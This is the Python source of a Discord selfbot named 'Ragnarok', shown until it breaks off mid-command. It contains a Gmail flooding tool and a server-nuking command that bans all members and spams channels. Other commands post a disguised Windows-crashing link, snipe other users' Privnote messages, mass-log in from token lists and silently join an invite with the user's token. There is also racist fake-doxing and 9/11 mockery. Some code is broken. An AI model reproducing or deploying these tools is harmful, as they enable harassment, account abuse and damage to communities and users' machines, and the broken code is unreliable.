class SELFBOT():
    __linecount__ = 1933
    __version__ = 6.2
	
import discord, subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, string, ctypes
import urllib.parse, urllib.request, re, json, requests, webbrowser, aiohttp, dns.name, asyncio, functools, logging, youtube_dl, wget, typing
import pypresence

from discord.ext import (
    commands,
    tasks
)
from pypresence import Presence
from bs4 import BeautifulSoup as bs4
from urllib.parse import urlencode
from pymongo import MongoClient
from selenium import webdriver
from threading import Thread
from subprocess import call
from itertools import cycle
from colorama import Fore
from sys import platform
from PIL import Image
import pyPrivnote as pn
from gtts import gTTS
import datetime

ctypes.windll.kernel32.SetConsoleTitleW(f'[Ragnarok Selfbot v{SELFBOT.__version__}] | Loading...')
def __init__(self, bot):
        self.bot = bot
        self.saved_roles = {}

def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)

        return inner

    return outer

#<--------------Colors Start-------------->
purple_dark= 0x6a006a
purple_medium= 0xa958a5
purple_light= 0xc481fb
orange= 0xffa500
gold= 0xdaa520
red_dark= 8e2430
red_light= 0xf94343
blue_dark= 0x3b5998
cyan= 0x5780cd
blue_light= 0xace9e7
aqua= 0x33a1ee
pink= 0xff9dbb
green_dark= 0x2ac075
green_light= 0xa1ee33
white= 0xf9f9f6
cream= 0xffdab9
#<--------------Colors End-------------->

with open('config2.json') as f:
    config = json.load(f)

token = config.get('token')
password = config.get('password')
prefix = config.get('prefix')

giveaway_sniper = config.get('giveaway_sniper')
slotbot_sniper = config.get('slotbot_sniper')
nitro_sniper = config.get('nitro_sniper')
privnote_sniper = config.get('privnote_sniper')

stream_url = config.get('stream_url')
tts_language = config.get('tts_language')

bitly_key = config.get('bitly_key')
cat_key = config.get('cat_key')
weather_key = config.get('weather_key')
cuttly_key = config.get('cuttly_key')

width = os.get_terminal_size().columns
hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()

languages = {
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

locales = [ 
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

m_numbers = [
    ":one:",
    ":two:", 
    ":three:", 
    ":four:", 
    ":five:", 
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]

def Clear():
    os.system('cls')
Clear()

def Init():
    if config.get('token') == "token-here":
        Clear()
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your token in the config.json file"+Fore.RESET)
    else:
        token = config.get('token')
        try:
            Ragnarok.run(token, bot=False, reconnect=True)
            os.system(f'title (Ragnarok Selfbot) - Version {SELFBOT.__version__}')
        except discord.errors.LoginFailure:
            print(f"{Fore.RED}[ERROR] {Fore.YELLOW}Improper token has been passed"+Fore.RESET)
            os.system('pause >NUL')

def GmailBomber():
    _smpt = smtplib.SMTP('smtp.gmail.com', 587)
    _smpt.starttls()
    username = input('Gmail: ')
    password = input('Gmail Password: ')
    try:
        _smpt.login(username, password)
    except:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW} Incorrect Password or gmail, make sure you've enabled less-secure apps access"+Fore.RESET)
    target = input('Target Gmail: ')
    message = input('Message to send: ')
    counter = eval(input('Ammount of times: '))
    count = 0
    while count < counter:
        count = 0
        _smpt.sendmail(username, target, message)
        count += 1
    if count == counter:
        pass

async def SendWhook():
    url = ""
    whook = {
        "embeds": [
            {
                "title": "",
                "description": "",
                "thumbnail": {
                    "url": ""
                },
                "footer": {
                    "text": ""
                }
            }
        ]
    }
    async with aiohttp.ClientSession() as session:
        await session.post(url, json=whook)

def GenAddress(addy: str):
	letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	four_char = ''.join(random.choice(letters) for _ in range(4))
	should_abbreviate = random.randint(0,1)
	if should_abbreviate == 0:
		if "street" in addy.lower():
			addy = addy.replace("Street", "St.")
			addy = addy.replace("street", "St.")
		elif "st." in addy.lower():
			addy = addy.replace("st.", "Street")
			addy = addy.replace("St.", "Street")
		if "court" in addy.lower():
			addy = addy.replace("court", "Ct.")
			addy = addy.replace("Court", "Ct.")
		elif "ct." in addy.lower():
			addy = addy.replace("ct.", "Court")
			addy = addy.replace("Ct.", "Court")
		if "rd." in addy.lower():
			addy = addy.replace("rd.", "Road")
			addy = addy.replace("Rd.", "Road")
		elif "road" in addy.lower():
			addy = addy.replace("road", "Rd.")
			addy = addy.replace("Road", "Rd.")
		if "dr." in addy.lower():
			addy = addy.replace("dr.", "Drive")
			addy = addy.replace("Dr.", "Drive")
		elif "drive" in addy.lower():
			addy = addy.replace("drive", "Dr.")
			addy = addy.replace("Drive", "Dr.")
		if "ln." in addy.lower():
			addy = addy.replace("ln.", "Lane")
			addy = addy.replace("Ln.", "Lane")
		elif "lane" in addy.lower():
			addy = addy.replace("lane", "Ln.")
			addy = addy.replace("lane", "Ln.")
	random_number = random.randint(1,99)
	extra_list = ["Apartment", "Unit", "Room"]
	random_extra = random.choice(extra_list)
	return four_char + " " + addy + " " + random_extra + " " + str(random_number)

def BotTokens():
    with open('Data/bot-tokens.txt', 'a+') as f:
        tokens = {token.strip() for token in f if token}
    for token in tokens:
        yield token

def UserTokens():
    with open('Data/user-tokens.txt', 'a+') as f:
        tokens = {token.strip() for token in f if token}
    for token in tokens:
        yield token

class Login(discord.Client):
    async def on_connect(self):
        guilds = len(self.guilds)
        users = len(self.users)
        print("")
        print(f"Connected to: [{self.user.name}]")
        print(f"Token: {self.http.token}")
        print(f"Guilds: {guilds}")
        print(f"Users: {users}")
        print("-------------------------------")
        await self.logout()

def _masslogin(choice):
    if choice == 'user':
        for token in UserTokens():
            loop.run_until_complete(Login().start(token, bot=False))
    elif choice == 'bot':
        for token in BotTokens():
            loop.run_until_complete(Login().start(token, bot=True))
    else:
        return        

def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)
        return inner
    return outer

@async_executor()
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=message.lower(), lang=tts_language)
    tts.write_to_fp(f)
    f.seek(0)
    return f

def Dump(ctx):
    for member in ctx.guild.members:
        f = open(f'Images/{ctx.guild.id}-Dump.txt', 'a+')
        f.write(str(member.avatar_url)+'\n')

def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'

def RandomColor(): 
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))

colorama.init()
Ragnarok = discord.Client()
Ragnarok = commands.Bot(
    description='Ragnarok Selfbot',
    command_prefix=prefix,
    self_bot=True
)
Ragnarok.remove_command('help') 

@tasks.loop(seconds=3)
async def btc_status():
    r = requests.get('https://api.coindesk.com/v1/bpi/currentprice/btc.json').json()
    value = r['bpi']['USD']['rate']
    await asyncio.sleep(3)
    btc_stream = discord.Streaming(
        name="Current BTC price: "+value+"$ USD", 
        url="https://www.twitch.tv/monstercat", 
    )
    await Ragnarok.change_presence(activity=btc_stream)

@Ragnarok.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}You're missing permission to execute this command"+Fore.RESET)
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Missing arguments: {error}"+Fore.RESET)
    elif isinstance(error, numpy.AxisError):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Not a valid image"+Fore.RESET)
    elif isinstance(error, discord.errors.Forbidden):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Discord error: {error}"+Fore.RESET)
    elif "Cannot send an empty message" in error_str:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Couldnt send a empty message"+Fore.RESET)               
    else:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{error_str}"+Fore.RESET)

@Ragnarok.event
async def on_message_edit(before, after):
    await Ragnarok.process_commands(after)

@Ragnarok.event
async def on_message(message):

    def GiveawayData():
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"   
    +Fore.RESET)

    def SlotBotData():
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"   
    +Fore.RESET)  

    def NitroData(elapsed, code):
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]" 
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
        f"\n{Fore.WHITE} - AUTHOR: {Fore.YELLOW}[{message.author}]"
        f"\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]"
        f"\n{Fore.WHITE} - CODE: {Fore.YELLOW}{code}"
    +Fore.RESET)

    def PrivnoteData(code):
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]" 
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
        f"\n{Fore.WHITE} - CONTENT: {Fore.YELLOW}[The content can be found at Privnote/{code}.txt]"
    +Fore.RESET)        

    time = datetime.datetime.now().strftime("%H:%M %p")  
    if 'discord.gift/' in message.content:
        if nitro_sniper == True:
            start = datetime.datetime.now()
            code = re.search("discord.gift/(.*)", message.content).group(1)
            token = config.get('token')
                
            headers = {'Authorization': token}
            r = requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem', 
                headers=headers,
            ).text
        
            elapsed = datetime.datetime.now() - start
            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

            if 'This gift has been redeemed already.' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Already Redeemed]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'subscription_plan' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Success]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'Unknown Gift Code' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Unknown Gift Code]"+Fore.RESET)
                NitroData(elapsed, code)
        else:
            return
            
    if 'Someone just dropped' in message.content:
        if slotbot_sniper == True:
            if message.author.id == 346353957029019648:
                try:
                    await message.channel.send('~grab')
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.CYAN}[{time} - SlotBot Couldnt Grab]"+Fore.RESET)
                    SlotBotData()                     
                print(""
                f"\n{Fore.CYAN}[{time} - Slotbot Grabbed]"+Fore.RESET)
                SlotBotData()
        else:
            return

    if 'GIVEAWAY' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:
                try:    
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.CYAN}[{time} - Giveaway Couldnt React]"+Fore.RESET)
                    GiveawayData()            
                print(""
                f"\n{Fore.CYAN}[{time} - Giveaway Sniped]"+Fore.RESET)
                GiveawayData()
        else:
            return

    if f'Congratulations <@{Ragnarok.user.id}>' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:    
                print(""
                f"\n{Fore.CYAN}[{time} - Giveaway Won]"+Fore.RESET)
                GiveawayData()
        else:
            return

    if 'GIVEAWAY' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 716967712844414996:
                try:    
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.CYAN}[{time} - Giveaway Couldnt React]"+Fore.RESET)
                    GiveawayData()            
                print(""
                f"\n{Fore.CYAN}[{time} - Giveaway Sniped]"+Fore.RESET)
                GiveawayData()
        else:
            return

    if f'Congratulations <@{Ragnarok.user.id}>' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 716967712844414996:    
                print(""
                f"\n{Fore.CYAN}[{time} - Giveaway Won]"+Fore.RESET)
                GiveawayData()
        else:
            return

    if 'privnote.com' in message.content:
        if privnote_sniper == True:
            code = re.search('privnote.com/(.*)', message.content).group(1)
            link = 'https://privnote.com/'+code
            try:
                note_text = pn.read_note(link)
            except Exception as e:
                print(e)    
            with open(f'Privnote/{code}.txt', 'a+') as f:
                print(""
                f"\n{Fore.CYAN}[{time} - Privnote Sniped]"+Fore.RESET)
                PrivnoteData(code)
                f.write(note_text)
        else:
            return
    await Ragnarok.process_commands(message)

@Ragnarok.event
async def on_connect():
    Clear()

    if giveaway_sniper == True:
        giveaway = "Active" 
    else:
        giveaway = "Disabled"

    if nitro_sniper == True:
        nitro = "Active"
    else:
        nitro = "Disabled"

    if slotbot_sniper == True:
        slotbot = "Active"
    else:
        slotbot = "Disabled"

    if privnote_sniper == True:
        privnote = "Active"
    else:
        privnote = "Disabled"    

    print(f'''{Fore.RESET}
{Fore.CYAN}:::::::..    :::.      .,-:::::/:::.    :::.  :::.    :::::::..       ...      :::  .   
{Fore.CYAN};;;;``;;;;   ;;`;;   ,;;-'````' `;;;;,  `;;;  ;;`;;   ;;;;``;;;;   .;;;;;;;.   ;;; .;;,.
{Fore.CYAN} [[[,/[[['  ,[[ '[[, [[[   [[[[[[/[[[[[. '[[ ,[[ '[[,  [[[,/[[['  ,[[     \[[, [[[[[/'  
{Fore.BLUE} $$$$$$c   c$$$cc$$$c"$$c.    "$$ $$$ "Y$c$$c$$$cc$$$c $$$$$$c    $$$,     $$$_$$$$,    
{Fore.BLUE} 888b "88bo,888   888,`Y8bo,,,o88o888    Y88 888   888,888b "88bo,"888,_ _,88P"888"88o, 
{Fore.BLUE} MMMM   "W" YMM   ""`   `'YMUP"YMMMMM     YM YMM   ""` MMMM   "W"   "YMMMMMP"  MMM "MMP"
                                                                
                        
{Fore.CYAN}RAGNAROK {SELFBOT.__version__} |
{Fore.GREEN}Logged in as: {Ragnarok.user.name}#{Ragnarok.user.discriminator} {Fore.CYAN}| ID: {Fore.GREEN}{Ragnarok.user.id}   
{Fore.CYAN}Privnote Sniper | {Fore.RED}{privnote} | {Fore.CYAN}Nitro Sniper | {Fore.GREEN}{nitro}
{Fore.CYAN}Giveaway Sniper | {Fore.RED}{giveaway} | {Fore.CYAN}SlotBot Sniper | {Fore.GREEN}{slotbot}
{Fore.CYAN}Prefix: {Fore.RED}{prefix}
                       
    '''+Fore.RESET)
    ctypes.windll.kernel32.SetConsoleTitleW(f'[RAGNAROK Selfbot v{SELFBOT.__version__}] | Logged in as {Ragnarok.user.name}')
    headers = {
      'Authorization': token,
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
    r = requests.post('https://discordapp.com/api/v6/invite/V93V3Eg', headers=headers)
    if r.status_code == 200:
        return True
    else:
        return False

@Ragnarok.command()
async def clear(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send('ﾠﾠ'+'\n' * 400 + 'ﾠﾠ')

@Ragnarok.command()
async def genname(ctx): # b'\xfc'
    await ctx.message.delete()
    first, second = random.choices(ctx.guild.members, k=2)
    first = first.display_name[len(first.display_name) // 2:]
    second = second.display_name[:len(second.display_name) // 2]
    await ctx.send(discord.utils.escape_mentions(second + first))

@Ragnarok.command()
async def lmgtfy(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    q = urlencode({"q": message})
    await ctx.send(f'<https://lmgtfy.com/?{q}>')

@Ragnarok.command()
async def login(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }   
            """
    driver.get("https://discordapp.com/login")
    driver.execute_script(script+f'\nlogin("{_token}")')    

@Ragnarok.command()
async def botlogin(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
    function login(token) {
      ((i) => {
        window.webpackJsonp.push([  
          [i], {
            [i]: (n, b, d) => {
              let dispatcher;
              for (let key in d.c) {
                if (d.c[key].exports) {
                  const module = d.c[key].exports.default || d.c[key].exports;
                  if (typeof(module) === 'object') {
                    if ('setToken' in module) {
                      module.setToken(token);
                      module.hideToken = () => {};
                    }
                    if ('dispatch' in module && '_subscriptions' in module) {
                      dispatcher = module;
                    }
                    if ('AnalyticsActionHandlers' in module) {
                      console.log('AnalyticsActionHandlers', module);
                      module.AnalyticsActionHandlers.handleTrack = (track) => {};
                    }
                  } else if (typeof(module) === 'function' && 'prototype' in module) {
                    const descriptors = Object.getOwnPropertyDescriptors(module.prototype);
                    if ('_discoveryFailed' in descriptors) {
                      const connect = module.prototype._connect;
                      module.prototype._connect = function(url) {
                        console.log('connect', url);
                        const oldHandleIdentify = this.handleIdentify;
                        this.handleIdentify = () => {
                          const identifyData = oldHandleIdentify();
                          identifyData.token = identifyData.token.split(' ').pop();
                          return identifyData;
                        };
                        const oldHandleDispatch = this._handleDispatch;
                        this._handleDispatch = function(data, type) {
                          if (type === 'READY') {
                            console.log(data);
                            data.user.bot = false;
                            data.user.email = 'Ragnarok-Was-Here@Fuckyou.com';
                            data.analytics_tokens = [];
                            data.connected_accounts = [];
                            data.consents = [];
                            data.experiments = [];
                            data.guild_experiments = [];
                            data.relationships = [];
                            data.user_guild_settings = [];
                          }
                          return oldHandleDispatch.call(this, data, type);
                        }
                        return connect.call(this, url);
                      };
                    }
                  }
                }
              }
              console.log(dispatcher);
              if (dispatcher) {
                dispatcher.dispatch({
                  type: 'LOGIN_SUCCESS',
                  token
                });
              }
            },
          },
          [
            [i],
          ],
        ]);
      })(Math.random());
    }
    """ 
    driver.get("https://discordapp.com/login")
    driver.execute_script(script+f'\nlogin("Bot {_token}")')

@Ragnarok.command()
async def address(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    addy = ' '.join(text)
    address_array = []
    i = 0
    while i < 10:
        address_array.append(GenAddress(addy))
        i+=1
    final_str = "\n".join(address_array)
    em = discord.Embed(description=final_str)
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(final_str)    

@Ragnarok.command()
async def weather(ctx, *, city): # b'\xfc'
    await ctx.message.delete()
    if weather_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Weather API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            req = requests.get(f'http://api.openweathermap.org/data/2.5/weather?q={city}&appid={weather_key}')
            r = req.json()
            temperature = round(float(r["main"]["temp"]) - 273.15, 1)
            lowest = round(float(r["main"]["temp_min"]) - 273.15, 1)
            highest = round(float(r["main"]["temp_max"]) - 273.15, 1)
            weather = r["weather"][0]["main"]
            humidity = round(float(r["main"]["humidity"]), 1)
            wind_speed = round(float(r["wind"]["speed"]), 1)
            em = discord.Embed(description=f'''
            Temperature: `{temperature}`
            Lowest: `{lowest}`
            Highest: `{highest}`
            Weather: `{weather}`
            Humidity: `{humidity}`
            Wind Speed: `{wind_speed}`
            ''')
            em.add_field(name='City', value=city.capitalize())
            em.set_thumbnail(url='https://ak0.picdn.net/shutterstock/videos/1019313310/thumb/1.jpg')
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(f'''
                Temperature: {temperature}
                Lowest: {lowest}
                Highest: {highest}
                Weather: {weather}
                Humidity: {humidity}
                Wind Speed: {wind_speed}
                City: {city.capitalize()}
                ''')    
        except KeyError:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{city} Is not a real city"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)

@Ragnarok.command(aliases=['shorteen'])
async def bitly(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    if bitly_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Bitly API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://api-ssl.bitly.com/v3/shorten?longUrl={link}&domain=bit.ly&format=json&access_token={bitly_key}') as req:
                    r = await req.read()
                    r = json.loads(r) 
            new = r['data']['url']
            em = discord.Embed()
            em.add_field(name='Shortened link', value=new, inline=False)
            await ctx.send(embed=em)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)
            
@Ragnarok.command()
async def update(self, ctx):
        '''Auto Update command, checks if you have latest version
        Use tags github-token to find out how to set up this token'''
        git = self.bot.get_cog('Git')
        if not await git.starred('MortemsAura/update/selfbot.py'): return await ctx.send('**This command is disabled as the user have not starred <https://github.com/MortemsAura/update/selfbot.py>**')
        # get username
        username = await git.githubusername()
        async with ctx.session.get('https://api.github.com/repos/MortemsAura/update/selfbot.py/git/refs/heads/rewrite', headers={"Authorization": f"Bearer {git.githubtoken}"}) as resp:
            if 300 > resp.status >= 200:
                async with ctx.session.post(f'https://api.github.com/repos/{username}/selfbot.py/merges', json={"head": (await resp.json())['object']['sha'], "base": "rewrite", "commit_message": "Updating Bot"}, headers={"Authorization": f"Bearer {git.githubtoken}"}) as resp2:
                    if 300 > resp2.status >= 200:
                        if resp2.status == 204:
                            return await ctx.send('Already at latest version!')
                        await ctx.send('Bot updated! Restarting...')
                    else:
                        if resp2.status == 409:
                            return await ctx.send('Merge conflict, you did some commits that made this fail!')
                        await ctx.send('Well, I failed somehow, send the following to `4JR#2713` (180314310298304512) - resp2: ```py\n' + str(await resp2.json()) + '\n```')
            else:
                await ctx.send('Well, I failed somehow, send the following to `4JR#2713` (180314310298304512) - resp: ```py\n' + str(await resp.json()) + '\n```')

@Ragnarok.command()
async def boom(ctx):
        list = (
            "```THIS MESSAGE WILL SELFDESTRUCT IN 5```",
            "```THIS MESSAGE WILL SELFDESTRUCT IN 4```",
            "```THIS MESSAGE WILL SELFDESTRUCT IN 3```",
            "```THIS MESSAGE WILL SELFDESTRUCT IN 2```",
            "```THIS MESSAGE WILL SELFDESTRUCT IN 1```",
            "```THIS MESSAGE WILL SELFDESTRUCT IN 0```",
            "💣",
            "💥",
        )
        for i in list:
            await asyncio.sleep(1.5)
            await ctx.message.edit(content=i)

@Ragnarok.command()
async def adminservers(ctx):
    await ctx.message.delete()
    admins = []
    bots = []
    kicks = []
    bans = []
    for guild in Ragnarok.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
            bots.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
            bans.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
            kicks.append(discord.utils.escape_markdown(guild.name))
    adminPermServers = f"`SERVERS WITH ADMIN ({len(admins)}):`\n`{admins}`"
    botPermServers = f"\n`SERVERS WITH BOT_ADD PERMISSION ({len(bots)}):`\n`{bots}`"
    banPermServers = f"\n`SERVERS WITH BAN PERMISSION ({len(bans)}):`\n`{bans}`"
    kickPermServers = f"\n`SERVERS WITH KICK PERMISSION ({len(kicks)}:`\n`{kicks}`"
    await ctx.send(adminPermServers + botPermServers + banPermServers + kickPermServers)

@Ragnarok.command()
async def stopcyclenick(ctx):
    await ctx.message.delete()
    global cycling
    cycling = False
    
@Ragnarok.command()
async def banner(ctx):
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.banner_url)
    await ctx.send(embed=em)

@Ragnarok.command()
async def nine_eleven(ctx):
    await ctx.message.delete()
    invis = ""  # char(173)
    message = await ctx.send(f'''
{invis}:man_wearing_turban::airplane:    :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis} :man_wearing_turban::airplane:   :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}  :man_wearing_turban::airplane:  :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}   :man_wearing_turban::airplane: :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}    :man_wearing_turban::airplane::office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
        :boom::boom::boom:    
        ''')

@Ragnarok.command()
async def sendembed(ctx, color: typing.Optional[discord.Color] = None, *, text):
        """embed text
        Parameters
        • text - the text to embed
        • color - the color of the embed, a random color is used if left empty
        """
        em = discord.Embed(color=color or random.randint(0, 0xFFFFFF))
        em.description = text
        await ctx.send(embed=em)
        await ctx.message.delete()

@Ragnarok.command()
async def crashlink(ctx):
        """Sends a link when clicked rapes a windwos computer"""
        await ctx.message.delete()
        await ctx.send("**CLICK HERE FOR FREE ROBUX OMG** <ms-cxh-full://0>")

@Ragnarok.command()
async def murder(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=RandString(),
            description="GET RAIDED",
            reason="RAGNAROK SELF-BOT",
            icon=None,
            banner=None
        )
    except:
        pass
    for _i in range(1000):
        await ctx.guild.create_text_channel(name="YOU WISH CUNT")
    for _i in range(1000):
        await ctx.guild.create_role(name="YOU WISH CUNT", color=RandomColor())

@Ragnarok.command()
async def phcomment(ctx, user: str = None, *, args=None):
    await ctx.message.delete()
    if user is None or args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://nekobot.xyz/api/imagegen?type=phcomment&text=" + args + "&username=" + user + "&image=" + str(
        ctx.author.avatar_url_as(format="png"))
    r = requests.get(endpoint)
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["message"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_pornhub_comment.png"))
    except:
        await ctx.send(res["message"])

@Ragnarok.command()
async def invnick(ctx):
    await ctx.message.delete()
    try:
        name = "‎‎‎‎‎‎‎‏‏‎ ឵឵ ឵឵ ឵឵ ឵឵‎"
        await ctx.author.edit(nick=name)
        await ctx.send(f"Now your nickname is invisible")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@Ragnarok.command()
async def fucknick(ctx):
    await ctx.message.delete()
    try:
        name = "𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫" 
        await ctx.author.edit(nick=name)
        await ctx.send(f"Now your nickname is a big mess :)")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@Ragnarok.command()
async def nickname(ctx, *, name: str=None):
    await ctx.message.delete()
    if name is None:
        await ctx.send(f"Usage: {ctx.prefix}rename <new name>")
    elif len(name) < 1:
        await ctx.send("Name need to have atleast 1 characters")
    else:
        try:
            await ctx.author.edit(nick=name)
            await ctx.send(f"Change nickname into `{name}`")
        except Exception as e:
            await ctx.send(f"Error: {e}")

@Ragnarok.command()
async def dox(ctx, user: discord.Member=None):
    await ctx.message.delete()
    emaillist = random.choice(["gmx.de", "yahoo.com", "protonmail.com", "gmail.com", "PornHub.com"])
    nr = random.choice(range(0,9999))
    ip = random.choice(["127.0.0.1", "192.168.0.1", "192.168.0.101"])
    country = random.choice(['Niger', 'Niggeria', "3rd wolrd country", "Africa"])
    if user is None:
        await ctx.send("Please mention a member")
    else:
        try:
            embed= discord.Embed(color= green_dark, title=f"Doxing in progress %0",description="Getting his email and address")
            embed.set_thumbnail(url="https://i.imgur.com/ZkFcOw6.gif")
            embed.set_footer(text=" MADE BY  Aura")
            a = await ctx.send(embed=embed)
            await asyncio.sleep(2)
            embed= discord.Embed(color= green_dark, title=f"Doxing in progress %50",description="Getting ip and stuffs")
            embed.set_thumbnail(url="https://i.imgur.com/ZkFcOw6.gif")
            embed.set_footer(text=" MADE BY  Aura")
